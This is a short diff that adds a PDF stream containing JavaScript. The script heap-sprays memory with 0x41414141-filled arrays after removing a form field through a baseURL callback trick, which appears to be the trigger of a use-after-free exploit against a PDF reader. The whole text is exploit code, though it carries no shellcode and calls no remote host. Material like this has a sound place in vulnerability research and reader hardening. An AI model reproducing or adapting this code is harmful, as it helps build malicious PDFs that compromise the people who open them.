@@ -1,0 +1,20 @@
+stream
+function spray() {
+gc();
+spray_array = new Array(0x20000);
+for (var i = 0 ; i < 10000 ; i++)
+{
+    spray_array[i] = new Uint32Array(0x300);
+    for (var j = 0; j < spray_array[i].length ; j++ )
+    {
+        spray_array[i][j] = 0x41414141;
+    }
+}
+return spray_array;
+}
+this.baseURL+="1";
+if(this.baseURL == "11"){
+  this.removeField("MyField");
+  spray();
+}
+endstream
